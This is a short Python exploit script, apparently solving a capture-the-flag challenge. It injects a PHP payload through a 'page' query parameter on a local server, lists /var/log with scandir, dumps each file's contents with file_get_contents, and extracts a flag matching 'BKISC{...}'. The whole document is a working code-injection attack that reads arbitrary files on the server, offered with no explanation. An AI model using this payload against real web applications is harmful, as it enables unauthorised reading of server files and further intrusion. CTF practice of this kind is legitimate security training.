import requests
import re

burl = "http://localhost:3001"

res = ""
for i in range(20):
    res += requests.get(burl+"/",params={
        "page": f"'.var_dump(file_get_contents('/var/log/'.scandir('/var/log')[{str(i)}])).'"    
    }).text
    
print("[+] Flag: ", re.findall(r"BKISC{.*}", res)[0])